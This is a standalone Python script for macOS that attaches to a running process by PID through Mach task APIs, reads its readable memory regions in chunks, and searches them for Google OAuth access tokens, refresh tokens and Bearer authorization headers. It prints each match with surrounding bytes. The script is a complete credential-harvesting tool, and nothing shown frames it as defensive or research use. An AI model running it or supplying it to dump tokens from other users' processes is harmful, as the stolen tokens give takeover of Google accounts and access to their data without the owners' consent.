#!/usr/bin/env python3
"""Scan a process's memory for Google OAuth access tokens (ya29.*)"""
import ctypes
import ctypes.util
import sys
import re

# macOS Mach APIs
libc = ctypes.CDLL(ctypes.util.find_library('c'))

# Types
mach_port_t = ctypes.c_uint32
kern_return_t = ctypes.c_int32
vm_address_t = ctypes.c_uint64
vm_size_t = ctypes.c_uint64
vm_offset_t = ctypes.c_uint64
natural_t = ctypes.c_uint32

# vm_region_basic_info_64
class vm_region_basic_info_64(ctypes.Structure):
    _fields_ = [
        ("protection", ctypes.c_int32),
        ("max_protection", ctypes.c_int32),
        ("inheritance", ctypes.c_uint32),
        ("shared", ctypes.c_uint32),  # boolean
        ("reserved", ctypes.c_uint32),  # boolean
        ("offset", vm_offset_t),
        ("behavior", ctypes.c_int32),
        ("user_wired_count", ctypes.c_uint16),
    ]

VM_REGION_BASIC_INFO_64 = 9
VM_REGION_BASIC_INFO_64_COUNT = ctypes.sizeof(vm_region_basic_info_64) // 4

# Function signatures
libc.mach_task_self.restype = mach_port_t
libc.task_for_pid.argtypes = [mach_port_t, ctypes.c_int32, ctypes.POINTER(mach_port_t)]
libc.task_for_pid.restype = kern_return_t

libc.mach_vm_region.argtypes = [
    mach_port_t,                          # target_task
    ctypes.POINTER(vm_address_t),         # address
    ctypes.POINTER(vm_size_t),            # size
    ctypes.c_int32,                       # flavor
    ctypes.POINTER(vm_region_basic_info_64),  # info
    ctypes.POINTER(natural_t),            # info_count
    ctypes.POINTER(mach_port_t),          # object_name
]
libc.mach_vm_region.restype = kern_return_t

libc.mach_vm_read_overwrite.argtypes = [
    mach_port_t,       # target_task
    vm_address_t,      # address
    vm_size_t,         # size
    vm_address_t,      # data (output buffer)
    ctypes.POINTER(vm_size_t),  # data_size
]
libc.mach_vm_read_overwrite.restype = kern_return_t


def scan_process(pid, patterns):
    """Scan process memory for patterns."""
    task = mach_port_t()
    self_task = libc.mach_task_self()

    ret = libc.task_for_pid(self_task, pid, ctypes.byref(task))
    if ret != 0:
        print(f"task_for_pid failed: {ret} (need sudo or SIP disabled)")
        return []

    results = []
    address = vm_address_t(0)
    size = vm_size_t(0)

    region_count = 0
    scanned_bytes = 0

    while True:
        info = vm_region_basic_info_64()
        info_count = natural_t(VM_REGION_BASIC_INFO_64_COUNT)
        object_name = mach_port_t()

        ret = libc.mach_vm_region(
            task,
            ctypes.byref(address),
            ctypes.byref(size),
            VM_REGION_BASIC_INFO_64,
            ctypes.byref(info),
            ctypes.byref(info_count),
            ctypes.byref(object_name),
        )

        if ret != 0:
            break

        region_count += 1

        # Only read readable regions, skip very large ones (>50MB)
        if info.protection & 1 and size.value < 50 * 1024 * 1024:
            # Read in chunks
            chunk_size = min(size.value, 4 * 1024 * 1024)
            offset = 0

            while offset < size.value:
                read_size = min(chunk_size, size.value - offset)
                buf = (ctypes.c_char * read_size)()
                out_size = vm_size_t(read_size)

                ret2 = libc.mach_vm_read_overwrite(
                    task,
                    vm_address_t(address.value + offset),
                    vm_size_t(read_size),
                    ctypes.cast(buf, ctypes.c_void_p).value,
                    ctypes.byref(out_size),
                )

                if ret2 == 0:
                    data = bytes(buf[:out_size.value])
                    scanned_bytes += len(data)

                    for pattern in patterns:
                        for m in re.finditer(pattern, data):
                            start = max(0, m.start() - 10)
                            end = min(len(data), m.end() + 200)
                            context = data[start:end]
                            # Filter printable
                            try:
                                text = context.decode('utf-8', errors='replace')
                                results.append((address.value + offset + m.start(), text))
                            except:
                                pass

                offset += read_size

        address.value += size.value

    print(f"Scanned {region_count} regions, {scanned_bytes / 1024 / 1024:.1f} MB")
    return results


if __name__ == '__main__':
    pid = int(sys.argv[1]) if len(sys.argv) > 1 else 37871

    print(f"Scanning PID {pid} for OAuth tokens...")

    patterns = [
        rb'ya29\.[A-Za-z0-9_-]{20,}',           # Google access token
        rb'1//[A-Za-z0-9_-]{20,}',               # Google refresh token
        rb'Bearer ya29\.',                         # Authorization header
        rb'authorization.*ya29\.',                 # auth header lowercase
    ]

    results = scan_process(pid, patterns)

    if results:
        print(f"\nFound {len(results)} matches:")
        seen = set()
        for addr, text in results:
            # Deduplicate by first 50 chars
            key = text[:50]
            if key not in seen:
                seen.add(key)
                print(f"\n  0x{addr:x}: {text[:300]}")
    else:
        print("No tokens found")
